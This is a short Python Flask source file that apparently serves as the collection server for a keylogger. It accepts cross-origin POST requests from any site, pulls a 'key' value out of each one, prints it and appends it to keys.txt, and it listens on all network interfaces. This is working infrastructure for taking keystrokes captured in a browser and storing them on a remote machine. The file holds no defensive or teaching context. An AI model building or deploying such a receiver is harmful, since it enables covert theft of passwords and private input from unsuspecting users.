from flask import Flask, request
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app) 

@app.route('/', methods=['POST'])
def handle_key_data():
    key_data = request.data.decode('utf-8')
    key_pressed = json.loads(key_data)['key']
    print(f"Key received: {key_pressed}")

    with open('keys.txt', 'a') as file:
        file.write(key_pressed)

    return 'Key received by the server'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
